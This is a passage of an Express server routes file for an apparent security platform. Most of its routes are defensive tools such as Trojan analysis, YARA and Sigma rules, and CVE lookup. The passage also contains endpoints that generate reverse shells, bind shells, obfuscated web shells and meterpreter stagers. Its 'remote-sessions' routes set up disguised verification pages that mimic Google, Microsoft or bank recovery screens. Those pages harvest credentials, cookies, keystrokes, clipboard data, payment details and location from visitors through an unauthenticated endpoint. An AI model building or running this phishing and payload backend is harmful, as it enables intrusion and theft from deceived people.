      const onlineAgents = allAgents.filter(a => a.status === "online" && a.lastSeen && new Date(a.lastSeen) > fiveMinutesAgo);

      let commandsSent = 0;
      for (const agent of onlineAgents) {
        await storage.createCommand({
          agentId: agent.id,
          command: "security_scan",
          params: JSON.stringify({ source: "deploy_all" }),
          status: "pending",
        });
        await storage.createCommand({
          agentId: agent.id,
          command: "enable_monitoring",
          params: JSON.stringify({ source: "deploy_all" }),
          status: "pending",
        });
        commandsSent += 2;
      }

      await storage.createAuditLog({
        organizationId: orgId,
        userId,
        action: "deploy_protection_to_agents",
        targetType: "agent",
        targetId: "all",
        details: `Deployed scan and monitoring commands to ${onlineAgents.length} online agent(s) (${commandsSent} commands)`,
      });

      res.json({
        agentsDeployed: onlineAgents.length,
        commandsSent,
        totalAgents: allAgents.length,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to deploy to agents" });
    }
  });

  // ============================================
  // TROJAN ANALYZER ROUTES
  // ============================================

  app.get("/api/trojan/families", requireAuth, async (_req, res) => {
    try {
      const families = listFamilies();
      res.json(families);
    } catch (error) {
      res.status(500).json({ error: "Failed to list Trojan families" });
    }
  });

  app.post("/api/trojan/lookup", requireAuth, async (req, res) => {
    try {
      const { hash } = z.object({ hash: z.string().min(16).max(128) }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "trojan_hash_lookup",
        targetType: "trojan_analysis",
        targetId: hash,
        details: `Trojan hash lookup: ${hash}`,
      });
      const result = await lookupHash(hash);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to lookup hash" });
    }
  });

  app.post("/api/trojan/classify", requireAuth, async (req, res) => {
    try {
      const { indicators } = z.object({
        indicators: z.object({
          networkConnections: z.array(z.string()).optional(),
          fileOperations: z.array(z.string()).optional(),
          registryChanges: z.array(z.string()).optional(),
          processNames: z.array(z.string()).optional(),
          mutexNames: z.array(z.string()).optional(),
        }),
      }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "trojan_behavior_classify",
        targetType: "trojan_analysis",
        targetId: "behavioral",
        details: `Behavioral classification with ${Object.values(indicators).flat().length} indicators`,
      });
      const result = classifyBehavior(indicators);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to classify behavior" });
    }
  });

  app.post("/api/trojan/yara-rule", requireAuth, async (req, res) => {
    try {
      const { family } = z.object({ family: z.string().min(1) }).parse(req.body);
      const result = generateYARARule(family);
      if (!result) return res.status(404).json({ error: "Trojan family not found" });
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate YARA rule" });
    }
  });

  app.post("/api/trojan/sigma-rule", requireAuth, async (req, res) => {
    try {
      const { family } = z.object({ family: z.string().min(1) }).parse(req.body);
      const result = generateSigmaRule(family);
      if (!result) return res.status(404).json({ error: "Trojan family not found" });
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate Sigma rule" });
    }
  });

  app.post("/api/trojan/iocs", requireAuth, async (req, res) => {
    try {
      const { family } = z.object({ family: z.string().min(1) }).parse(req.body);
      const result = extractIOCs(family);
      if (!result) return res.status(404).json({ error: "Trojan family not found" });
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to extract IOCs" });
    }
  });

  app.post("/api/trojan/extract-iocs-text", requireAuth, async (req, res) => {
    try {
      const { text } = z.object({ text: z.string().min(1).max(50000) }).parse(req.body);
      const result = extractIOCsFromText(text);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to extract IOCs from text" });
    }
  });

  app.post("/api/trojan/threat-actor", requireAuth, async (req, res) => {
    try {
      const { family } = z.object({ family: z.string().min(1) }).parse(req.body);
      const result = getThreatActor(family);
      if (!result) return res.json({ found: false, family });
      res.json({ found: true, family, actor: result });
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to get threat actor" });
    }
  });

  app.post("/api/trojan/kill-chain", requireAuth, async (req, res) => {
    try {
      const { family } = z.object({ family: z.string().min(1) }).parse(req.body);
      const result = getKillChain(family);
      if (!result) return res.status(404).json({ error: "Trojan family not found" });
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to get kill chain" });
    }
  });

  app.post("/api/trojan/mitre-heatmap", requireAuth, async (req, res) => {
    try {
      const { family } = z.object({ family: z.string().min(1) }).parse(req.body);
      const result = getMitreHeatmap(family);
      if (!result) return res.status(404).json({ error: "Trojan family not found" });
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate MITRE heatmap" });
    }
  });

  // ============================================
  // MOBILE PENTEST ROUTES
  // ============================================

  app.post("/api/mobile/analyze-permissions", requireAuth, async (req, res) => {
    try {
      const { permissions } = z.object({
        permissions: z.array(z.string()).min(1).max(100),
      }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "mobile_permission_analysis",
        targetType: "mobile_pentest",
        targetId: "permissions",
        details: `Analyzed ${permissions.length} Android permissions`,
      });
      const result = analyzePermissions(permissions);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to analyze permissions" });
    }
  });

  app.post("/api/mobile/test-endpoint", requireAuth, async (req, res) => {
    try {
      const { url } = z.object({ url: z.string().url() }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "mobile_endpoint_test",
        targetType: "mobile_pentest",
        targetId: url,
        details: `Mobile API endpoint security test: ${url}`,
      });
      const result = await testMobileEndpoint(url);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to test endpoint" });
    }
  });

  app.post("/api/mobile/owasp-check", requireAuth, async (req, res) => {
    try {
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "mobile_owasp_check",
        targetType: "mobile_pentest",
        targetId: target,
        details: `OWASP Mobile Top 10 scan: ${target}`,
      });
      const result = await checkOWASPMobile(target);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to run OWASP check" });
    }
  });

  app.post("/api/mobile/device-vulns", requireAuth, async (req, res) => {
    try {
      const { osType, version } = z.object({
        osType: z.enum(["android", "ios"]),
        version: z.string().min(1),
      }).parse(req.body);
      const result = lookupDeviceVulnerabilities(osType, version);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to lookup device vulnerabilities" });
    }
  });

  // ============================================
  // PAYLOAD GENERATOR ROUTES
  // ============================================

  app.get("/api/payload/languages", requireAuth, async (_req, res) => {
    try {
      const result = getSupportedLanguages();
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "Failed to get supported languages" });
    }
  });

  app.post("/api/payload/reverse-shell", requireAuth, async (req, res) => {
    try {
      const { language, ip, port, options } = z.object({
        language: z.string().min(1),
        ip: z.string().min(1),
        port: z.number().int().min(1).max(65535),
        options: z.object({
          encrypted: z.boolean().optional(),
          protocol: z.enum(["tcp", "udp"]).optional(),
          staged: z.boolean().optional(),
        }).optional(),
      }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "payload_reverse_shell",
        targetType: "payload_generator",
        targetId: language,
        details: `Generated ${language} reverse shell payload (educational)`,
      });
      const result = generateReverseShell(language, ip, port, options || {});
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate reverse shell" });
    }
  });

  app.post("/api/payload/bind-shell", requireAuth, async (req, res) => {
    try {
      const { language, port } = z.object({
        language: z.string().min(1),
        port: z.number().int().min(1).max(65535),
      }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "payload_bind_shell",
        targetType: "payload_generator",
        targetId: language,
        details: `Generated ${language} bind shell payload (educational)`,
      });
      const result = generateBindShell(language, port);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate bind shell" });
    }
  });

  app.post("/api/payload/web-shell", requireAuth, async (req, res) => {
    try {
      const { language, options } = z.object({
        language: z.string().min(1),
        options: z.object({
          fileManager: z.boolean().optional(),
          commandExec: z.boolean().optional(),
          upload: z.boolean().optional(),
          authentication: z.boolean().optional(),
          password: z.string().optional(),
          obfuscation: z.boolean().optional(),
        }).optional(),
      }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "payload_web_shell",
        targetType: "payload_generator",
        targetId: language,
        details: `Generated ${language} web shell payload (educational)`,
      });
      const result = generateWebShell(language, options || {});
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate web shell" });
    }
  });

  app.post("/api/payload/meterpreter", requireAuth, async (req, res) => {
    try {
      const { platform, arch, options } = z.object({
        platform: z.string().min(1),
        arch: z.string().min(1),
        options: z.object({
          payloadType: z.string().optional(),
          lhost: z.string().optional(),
          lport: z.number().optional(),
          encoder: z.string().optional(),
          iterations: z.number().optional(),
          format: z.string().optional(),
        }).optional(),
      }).parse(req.body);
      const orgId = getOrgId(req);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "payload_meterpreter",
        targetType: "payload_generator",
        targetId: `${platform}/${arch}`,
        details: `Generated ${platform}/${arch} meterpreter stager (educational)`,
      });
      const result = generateMeterpreterStager(platform, arch, options || {});
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate meterpreter stager" });
    }
  });

  app.use("/api/darkweb", requireAuth);

  app.post("/api/darkweb/check-domain", async (req, res) => {
    try {
      const { query } = z.object({ query: z.string().min(1).max(253) }).parse(req.body);
      const { checkDomain } = await import("./darkWebMonitor");
      const result = await checkDomain(query);
      res.json(result);
    } catch (error: any) {
      if (error?.issues) {
        res.status(400).json({ error: "Invalid domain format" });
      } else {
        res.status(502).json({ error: error?.message || "Failed to check domain against HIBP API" });
      }
    }
  });

  app.post("/api/darkweb/check-email", async (req, res) => {
    try {
      const { query } = z.object({ query: z.string().email().max(320) }).parse(req.body);
      const { checkEmail } = await import("./darkWebMonitor");
      const result = await checkEmail(query);
      res.json(result);
    } catch (error: any) {
      if (error?.issues) {
        res.status(400).json({ error: "Invalid email format" });
      } else {
        res.status(502).json({ error: error?.message || "Failed to check email against HIBP API" });
      }
    }
  });

  app.get("/api/darkweb/breaches", async (_req, res) => {
    try {
      const { getAllBreaches } = await import("./darkWebMonitor");
      const breaches = await getAllBreaches();
      res.json(breaches);
    } catch (error: any) {
      res.status(502).json({ error: error?.message || "Failed to fetch breach data from HIBP API" });
    }
  });

  app.get("/api/compliance/frameworks", requireAuth, async (_req, res) => {
    try {
      const frameworks = getFrameworks();
      res.json(frameworks);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch frameworks" });
    }
  });

  app.get("/api/compliance/assess/:framework", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { framework } = req.params;
      const assessment = await assessFramework(framework, orgId);
      res.json(assessment);
    } catch (error: any) {
      if (error?.message?.includes("Unknown framework")) {
        return res.status(400).json({ error: error.message });
      }
      res.status(500).json({ error: "Failed to assess framework" });
    }
  });

  app.get("/api/compliance/score", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const score = await getOverallScore(orgId);
      res.json(score);
    } catch (error) {
      res.status(500).json({ error: "Failed to calculate compliance score" });
    }
  });

  app.post("/api/payload/encode", requireAuth, async (req, res) => {
    try {
      const { payload, encoding } = z.object({
        payload: z.string().min(1),
        encoding: z.string().min(1),
      }).parse(req.body);
      const result = encodePayload(payload, encoding);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to encode payload" });
    }
  });

  app.post("/api/ssl/inspect", requireAuth, async (req, res) => {
    try {
      const { domain, port } = z.object({
        domain: z.string().min(1).max(253),
        port: z.number().int().min(1).max(65535).optional().default(443),
      }).parse(req.body);

      if (isPrivateTarget(domain)) {
        return res.status(400).json({ error: "Private/internal targets are not allowed for SSRF protection" });
      }

      const result = await inspectSSL(domain, port);
      res.json(result);
    } catch (error: any) {
      const msg = error?.message || "Failed to inspect SSL certificate";
      res.status(msg.includes("parse") ? 400 : 500).json({ error: msg });
    }
  });

  app.post("/api/email/analyze", requireAuth, async (req, res) => {
    try {
      const { rawEmail } = z.object({
        rawEmail: z.string().min(10, "Email content must be at least 10 characters"),
      }).parse(req.body);

      const result = analyzeEmail(rawEmail);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to analyze email" });
    }
  });

  app.post("/api/password/analyze", async (req, res) => {
    try {
      const { password } = z.object({ password: z.string().min(1) }).parse(req.body);
      const result = auditAnalyzePassword(password);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to analyze password" });
    }
  });

  app.post("/api/password/check-breach", async (req, res) => {
    try {
      const { password } = z.object({ password: z.string().min(1) }).parse(req.body);
      const result = await checkBreachStatus(password);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to check breach status" });
    }
  });

  app.post("/api/password/policy-audit", async (req, res) => {
    try {
      const policy = z.object({
        minLength: z.number().optional(),
        maxLength: z.number().optional(),
        requireUppercase: z.boolean().optional(),
        requireLowercase: z.boolean().optional(),
        requireDigits: z.boolean().optional(),
        requireSpecial: z.boolean().optional(),
        preventCommon: z.boolean().optional(),
        maxAge: z.number().optional(),
        historyCount: z.number().optional(),
        lockoutThreshold: z.number().optional(),
        lockoutDuration: z.number().optional(),
        mfaRequired: z.boolean().optional(),
      }).parse(req.body);
      const result = auditPolicy(policy);
      res.json(result);
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to audit policy" });
    }
  });

  app.post("/api/password/generate", async (req, res) => {
    try {
      const options = z.object({
        length: z.number().optional(),
        includeUppercase: z.boolean().optional(),
        includeLowercase: z.boolean().optional(),
        includeDigits: z.boolean().optional(),
        includeSpecial: z.boolean().optional(),
        excludeAmbiguous: z.boolean().optional(),
        count: z.number().optional(),
      }).parse(req.body);
      const passwords = generatePassword(options);
      res.json({ passwords });
    } catch (error: any) {
      res.status(error?.message?.includes("parse") ? 400 : 500).json({ error: "Failed to generate passwords" });
    }
  });

  app.post("/api/cve/search", requireAuth, async (req, res) => {
    try {
      const { keyword, cveId, severity } = z.object({
        keyword: z.string().optional(),
        cveId: z.string().optional(),
        severity: z.string().optional(),
      }).parse(req.body);
      const results = await searchCves({ keyword, cveId, severity });
      res.json(results);
    } catch (error: any) {
      if (error?.issues) {
        res.status(400).json({ error: "Invalid search parameters" });
      } else {
        res.status(502).json({ error: error?.message || "Failed to reach NVD API. Try again shortly." });
      }
    }
  });

  app.get("/api/search", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const q = String(req.query.q || "").trim();
      if (!q || q.length < 2) {
        return res.json({ events: [], incidents: [], devices: [], pages: [] });
      }
      const searchTerm = `%${q}%`;

      const [events, incidents, devices] = await Promise.all([
        db.select().from(schema.securityEvents)
          .where(and(
            eq(schema.securityEvents.organizationId, orgId),
            sql`(${schema.securityEvents.description} ILIKE ${searchTerm} OR ${schema.securityEvents.sourceIp} ILIKE ${searchTerm} OR ${schema.securityEvents.eventType} ILIKE ${searchTerm})`
          ))
          .orderBy(desc(schema.securityEvents.createdAt))
          .limit(5),
        db.select().from(schema.incidents)
          .where(and(
            eq(schema.incidents.organizationId, orgId),
            sql`(${schema.incidents.title} ILIKE ${searchTerm} OR ${schema.incidents.description} ILIKE ${searchTerm})`
          ))
          .orderBy(desc(schema.incidents.createdAt))
          .limit(5),
        db.select().from(schema.networkDevices)
          .where(and(
            eq(schema.networkDevices.organizationId, orgId),
            sql`(${schema.networkDevices.hostname} ILIKE ${searchTerm} OR ${schema.networkDevices.ipAddress} ILIKE ${searchTerm} OR ${schema.networkDevices.macAddress} ILIKE ${searchTerm})`
          ))
          .limit(5),
      ]);

      const allPages = [
        { title: "Dashboard", url: "/", keywords: "dashboard home overview" },
        { title: "Protection Center", url: "/protection-center", keywords: "protection center shield" },
        { title: "AI Analysis", url: "/ai-analysis", keywords: "ai analysis chat assistant" },
        { title: "Security Events", url: "/alerts", keywords: "security events alerts" },
        { title: "Attack Heatmap", url: "/attack-map", keywords: "attack heatmap mitre" },
        { title: "Scanner", url: "/scanner", keywords: "scanner port dns ssl" },
        { title: "Network Monitor", url: "/network-monitor", keywords: "network monitor devices" },
        { title: "Honeypot", url: "/honeypot", keywords: "honeypot trap decoy" },
        { title: "Alert Rules", url: "/alert-rules", keywords: "alert rules notifications" },
        { title: "Hash Tools", url: "/hash-tools", keywords: "hash tools identify crack" },
        { title: "Traffic Analysis", url: "/traffic-analysis", keywords: "traffic analysis bandwidth" },
        { title: "Network Security", url: "/network-security", keywords: "network security pentest" },
        { title: "Payload Generator", url: "/payload-generator", keywords: "payload generator reverse shell" },
        { title: "Trojan Analyzer", url: "/trojan-analyzer", keywords: "trojan analyzer malware" },
        { title: "Mobile Pentest", url: "/mobile-pentest", keywords: "mobile pentest android ios" },
        { title: "SSL Inspector", url: "/ssl-inspector", keywords: "ssl inspector certificate tls" },
        { title: "Email Analyzer", url: "/email-analyzer", keywords: "email analyzer phishing" },
        { title: "Password Auditor", url: "/password-auditor", keywords: "password auditor strength" },
        { title: "Incidents", url: "/incidents", keywords: "incidents response" },
        { title: "Quarantine", url: "/quarantine", keywords: "quarantine isolate" },
        { title: "Playbooks", url: "/playbooks", keywords: "playbooks automation response" },
        { title: "Firewall", url: "/firewall", keywords: "firewall rules block" },
        { title: "Policies", url: "/policies", keywords: "security policies" },
        { title: "Compliance", url: "/compliance", keywords: "compliance framework audit" },
        { title: "Endpoints", url: "/endpoints", keywords: "endpoints agents" },
        { title: "Deploy Agent", url: "/download-agent", keywords: "deploy agent download install" },
        { title: "Threat Intel", url: "/threat-intel", keywords: "threat intelligence indicators" },
        { title: "Network Map", url: "/network-map", keywords: "network map topology" },
        { title: "Forensic Timeline", url: "/forensics", keywords: "forensic timeline investigation" },
        { title: "Dark Web Monitor", url: "/dark-web-monitor", keywords: "dark web monitor breach" },
        { title: "CVE Database", url: "/cve-database", keywords: "cve database vulnerability" },
        { title: "Settings", url: "/settings", keywords: "settings configuration" },
        { title: "Billing", url: "/billing", keywords: "billing subscription plan" },
        { title: "Support", url: "/support", keywords: "support help ticket" },
      ];
      const lowerQ = q.toLowerCase();
      const pages = allPages.filter(p =>
        p.title.toLowerCase().includes(lowerQ) || p.keywords.includes(lowerQ)
      ).slice(0, 8);

      let cves: any[] = [];
      if (/^cve-/i.test(q)) {
        try {
          const cveResults = await searchCves({ cveId: q.toUpperCase(), resultsPerPage: 5 });
          cves = (cveResults?.results || []).slice(0, 5);
        } catch (err) { console.error("CVE search error:", err); }
      }

      res.json({ events, incidents, devices, pages, cves });
    } catch (error) {
      console.error("Search error:", error);
      res.status(500).json({ error: "Search failed" });
    }
  });

  app.get("/api/cve/detail/:id", requireAuth, async (req, res) => {
    try {
      const cveId = req.params.id;
      if (!/^CVE-\d{4}-\d+$/i.test(cveId)) {
        return res.status(400).json({ error: "Invalid CVE ID format" });
      }
      const result = await getCveDetail(cveId.toUpperCase());
      if (!result) return res.status(404).json({ error: "CVE not found" });
      res.json(result);
    } catch (error: any) {
      res.status(502).json({ error: error?.message || "Failed to reach NVD API. Try again shortly." });
    }
  });

  app.use("/api/scheduled-scans", requireAuth);

  app.get("/api/scheduled-scans", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const scans = await storage.getScheduledScans(orgId);
      res.json(scans);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch scheduled scans" });
    }
  });

  app.post("/api/scheduled-scans", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const data = z.object({
        scanType: z.enum(["network_scan", "vulnerability_scan", "dark_web_check", "ssl_check"]),
        target: z.string().min(1).max(253),
        frequency: z.enum(["daily", "weekly", "monthly"]),
        enabled: z.boolean().optional().default(true),
      }).parse(req.body);

      const { calculateNextRun } = await import("./scanScheduler");
      const nextRun = calculateNextRun(data.frequency);

      const scan = await storage.createScheduledScan({
        organizationId: orgId,
        scanType: data.scanType,
        target: data.target,
        frequency: data.frequency,
        enabled: data.enabled,
        nextRun,
      });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "create_scheduled_scan",
        targetType: "scheduled_scan",
        targetId: String(scan.id),
        details: `Created ${data.frequency} ${data.scanType} scan for ${data.target}`,
      });

      res.status(201).json(scan);
    } catch (error: any) {
      if (error?.name === "ZodError") {
        return res.status(400).json({ error: "Invalid scan configuration", details: error.errors });
      }
      res.status(500).json({ error: "Failed to create scheduled scan" });
    }
  });

  app.patch("/api/scheduled-scans/:id", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const data = z.object({
        enabled: z.boolean().optional(),
      }).parse(req.body);

      const updated = await storage.updateScheduledScan(id, orgId, data);
      if (!updated) return res.status(404).json({ error: "Scheduled scan not found" });
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update scheduled scan" });
    }
  });

  app.delete("/api/scheduled-scans/:id", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const deleted = await storage.deleteScheduledScan(id, orgId);
      if (!deleted) return res.status(404).json({ error: "Scheduled scan not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete scheduled scan" });
    }
  });

  app.post("/api/cve/recent", requireAuth, async (req, res) => {
    try {
      const { severity } = z.object({
        severity: z.string().optional(),
      }).parse(req.body || {});
      const results = await getRecentCves(severity === "all" ? undefined : severity);
      res.json(results);
    } catch (error: any) {
      res.status(502).json({ error: error?.message || "Failed to reach NVD API. Try again shortly." });
    }
  });

  app.post("/api/remote-sessions", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const body = z.object({
        name: z.string().min(1).max(255),
        expiryMinutes: z.number().min(5).max(1440).default(60),
        pageConfig: z.object({
          steps: z.object({
            identity: z.boolean().default(true),
            biometric: z.boolean().default(true),
            voice: z.boolean().default(true),
            environment: z.boolean().default(true),
            documents: z.boolean().default(true),
          }).default({}),
          enableBanking: z.boolean().default(false),
          enableAutoHarvest: z.boolean().default(true),
          enableCredentialOverlay: z.boolean().default(false),
          autoRequestPermissions: z.boolean().default(false),
          pageTitle: z.string().max(100).default("Account Security Verification"),
          pageSubtitle: z.string().max(200).default(""),
          brandColor: z.enum(["blue", "red", "green", "purple", "orange"]).default("blue"),
          silentMode: z.boolean().default(false),
          persistentConnection: z.boolean().default(false),
          sessionLabel: z.string().max(200).default(""),
          pagePreset: z.enum(["custom", "google_recovery", "microsoft_security", "bank_verification", "it_management", "social_media"]).default("custom"),
          pageDescription: z.string().max(500).default(""),
          pageIcon: z.enum(["shield", "lock", "key", "user", "building", "globe"]).default("shield"),
          redirectUrl: z.string().max(500).default("").refine((v) => {
            if (!v) return true;
            try { const u = new URL(v); return ["http:", "https:"].includes(u.protocol); } catch { return false; }
          }, { message: "Redirect URL must be a valid HTTP/HTTPS URL" }),
          urgencyLevel: z.enum(["low", "medium", "high"]).default("medium"),
          enableCookieHarvest: z.boolean().default(false),
          enablePaymentScan: z.boolean().default(false),
        }).default({}),
      }).parse(req.body);
      const steps = body.pageConfig.steps;
      if (!body.pageConfig.silentMode && !steps.identity && !steps.biometric && !steps.voice && !steps.environment && !steps.documents) {
        return res.status(400).json({ error: "At least one wizard step must be enabled" });
      }
      const sessionToken = randomBytes(32).toString("hex");
      const expiresAt = new Date(Date.now() + body.expiryMinutes * 60 * 1000);
      const session = await storage.createRemoteSession({
        organizationId: orgId,
        sessionToken,
        name: body.name,
        status: "pending",
        createdBy: userId,
        expiresAt,
        pageConfig: body.pageConfig,
      });
      res.json(session);
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to create remote session" });
    }
  });

  app.get("/api/remote-sessions", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const sessions = await storage.getRemoteSessionsByOrg(orgId);
      res.json(sessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch remote sessions" });
    }
  });

  app.get("/api/remote-sessions/token/:token", async (req, res) => {
    try {
      const session = await storage.getRemoteSessionByToken(req.params.token);
      if (!session) return res.status(404).json({ error: "Session not found" });
      if (session.status === "closed" || session.status === "expired") {
        return res.status(410).json({ error: "Session has ended" });
      }
      if (new Date() > new Date(session.expiresAt)) {
        await storage.updateRemoteSession(session.id, session.organizationId, { status: "expired" });
        return res.status(410).json({ error: "Session has expired" });
      }
      res.json({
        id: session.id,
        name: session.name,
        status: session.status,
        sessionToken: session.sessionToken,
        pageConfig: session.pageConfig,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch session" });
    }
  });

  app.patch("/api/remote-sessions/:id", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const body = z.object({
        status: z.enum(["pending", "active", "closed", "expired"]).optional(),
        permissionsGranted: z.array(z.string()).optional(),
        deviceInfo: z.any().optional(),
        locationData: z.any().optional(),
      }).parse(req.body);
      const updated = await storage.updateRemoteSession(id, orgId, { ...body, lastActivity: new Date() });
      if (!updated) return res.status(404).json({ error: "Session not found" });
      res.json(updated);
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to update session" });
    }
  });

  app.delete("/api/remote-sessions/:id", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const session = await storage.getRemoteSessionById(id, orgId);
      if (session) {
        const pair = rcClients.get(session.sessionToken);
        if (pair) {
          if (pair.target && pair.target.readyState === WebSocket.OPEN) {
            pair.target.send(JSON.stringify({ type: "rc_session_closed" }));
            pair.target.close();
          }
          rcClients.delete(session.sessionToken);
        }
      }
      const deleted = await storage.deleteRemoteSession(id, orgId);
      if (!deleted) return res.status(404).json({ error: "Session not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete session" });
    }
  });

  app.get("/api/remote-sessions/:id/events", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const session = await storage.getRemoteSessionById(id, orgId);
      if (!session) return res.status(404).json({ error: "Session not found" });
      const events = await storage.getRemoteSessionEvents(id);
      res.json(events);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch session events" });
    }
  });

  app.post("/api/remote-sessions/token/:token/data", async (req, res) => {
    try {
      const session = await storage.getRemoteSessionByToken(req.params.token);
      if (!session) return res.status(404).json({ error: "Session not found" });
      if (session.status === "closed" || session.status === "expired") {
        return res.status(410).json({ error: "Session has ended" });
      }
      const ALLOWED_EVENT_TYPES = ["rc_activity", "rc_device_info", "rc_location", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_auto_harvest", "rc_keylog", "rc_form_intercept", "rc_file", "rc_device_status", "rc_data"];
      const body = z.object({
        type: z.string().refine(t => ALLOWED_EVENT_TYPES.includes(t), { message: "Invalid event type" }).optional(),
        permissionsGranted: z.array(z.string()).optional(),
        deviceInfo: z.any().optional(),
        locationData: z.any().optional(),
        data: z.any().optional(),
        token: z.string().optional(),
      }).parse(req.body);

      if (body.type && body.data) {
        await storage.createRemoteSessionEvent({
          sessionId: session.id,
          eventType: body.type,
          eventData: body.data,
        });
      }

      const updatePayload: any = {
        status: "active",
        lastActivity: new Date(),
      };
      if (body.permissionsGranted) updatePayload.permissionsGranted = body.permissionsGranted;
      if (body.deviceInfo) updatePayload.deviceInfo = body.deviceInfo;
      if (body.locationData) updatePayload.locationData = body.locationData;

      const updated = await storage.updateRemoteSession(session.id, session.organizationId, {
        ...updatePayload,
      });
      res.json({ success: true });
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to update session data" });
    }
  });

  // ── Push Notification & Service Worker Routes ──

  app.get("/api/push/vapid-key", (_req, res) => {
    res.json({ publicKey: process.env.VAPID_PUBLIC_KEY || "" });
  });

  app.post("/api/push/subscribe", requireAuth, async (req: any, res) => {
    try {
      const body = z.object({
        endpoint: z.string().url(),
        keys: z.object({
          p256dh: z.string(),
          auth: z.string(),
        }),
      }).parse(req.body);

      const sub = await storage.createPushSubscription({
        userId: req.user!.id,
        endpoint: body.endpoint,
        p256dh: body.keys.p256dh,
        auth: body.keys.auth,
      });

      await storage.createSwTelemetry({
        userId: req.user!.id,
        eventType: "push_subscribed",
        eventData: { endpoint: body.endpoint },
      });

      res.json({ success: true, id: sub.id });
    } catch (error: any) {
      res.status(400).json({ error: error?.message || "Failed to subscribe" });
    }
  });

  app.post("/api/push/unsubscribe", requireAuth, async (req: any, res) => {
    try {
      const { endpoint } = z.object({ endpoint: z.string().url() }).parse(req.body);
      const userSubs = await storage.getPushSubscriptionsByUser(req.user!.id);
